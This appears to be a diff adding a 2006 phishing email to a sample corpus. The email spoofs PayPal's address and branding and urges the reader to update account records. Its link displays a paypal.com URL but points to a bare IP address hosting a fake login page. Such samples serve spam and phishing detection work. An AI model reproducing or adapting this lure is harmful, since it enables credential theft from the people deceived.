@@ -1,0 +1,63 @@
+Return-Path: <security@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by example.com (Postfix) with ESMTP id C679B469D9
+	for <user@login.example.com>; Fri, 29 Sep 2006 20:38:46 -0400 (EDT)
+Received: from 192.168.1.2 (host145-97-static.32-85-b.business.telecomitalia.it [85.32.97.145])
+	by mail.example.org (Postfix) with SMTP id 642FE6FA3FD
+	for <user@example.com>; Fri, 29 Sep 2006 20:38:46 -0400 (EDT)
+Received: from 69.243.56.130 by ; Fri, 29 Sep 2006 23:33:50 -0200
+Message-ID: <JPAHIDZHFDRQJTPUWWXRLDCQ@earthlink.net>
+From: "PayPal" <security@paypal.com>
+Reply-To: "PayPal" <security@paypal.com>
+To: user@example.com
+Subject: PayPal Request Member Verification Procedure (Routing Code 6P1s1Q4)
+Date: Sat, 30 Sep 2006 05:40:50 +0400
+X-Mailer: Internet Mail Service (5.5.2650.21)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--8630214152682323"
+X-Priority: 1
+X-MSMail-Priority: High
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 347
+
+----8630214152682323
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<title>PayPal Security Service </title>
+</head>
+ 
+<body>
+ 
+<p>
+<img border=3D"0" src=3D"http://www.paypalobjects.com/en_US/i/header/t1Hdr=
+_idOverview_589x156.jpg" width=3D"600" height=3D"168"></p>
+<FONT face=3D"Courier New" size=3D2>Dear valued PayPal member :<BR><BR>Ide=
+ntity protection matters and PayPal works day and night to help keep<BR>yo=
+ur identity
+safe.<BR><BR>That's why it was come to our attention that your PayPal acco=
+unt information<BR>needs to be updated as part of our continuing commitmen=
+t to protect your <BR>account and to reduce the instance of fraud on our w=
+ebsite.If u could take 5-<BR><BR>10 minutes out of your online experience =
+and update your personal records<BR>you will not run into any future probl=
+ems with the online service.However , <BR>failure to update your records, =
+your PayPal session will not be interrupted<BR><BR>and will continued as n=
+ormal.<BR><BR>To login to your paypal account and update your records clic=
+k on the<BR>following link:<BR><BR><A class=3Dm1
+href=3D"http://67.143.146.230:8000/paypal/cgi-bin/login.html" target=3D_bl=
+ank><FONT
+face=3D"Courier New" color=3D#0066cc size=3D2>https://www.paypal.com/us/cg=
+i-bin/webscr?
+cmd=3D_login-run</FONT></A><BR><BR>Thank you for using PayPal<BR><BR>
+<FONT color=3D#006699 size=3D2>Privacy Notice</FONT></A><FONT 
+color=3D#006699 size=3D2> </FONT><FONT size=3D2>=A92006, PayPal, Inc. or i=
+ts 
+affiliates. </FONT></SPAN></FONT></P>
+
+----8630214152682323--
+
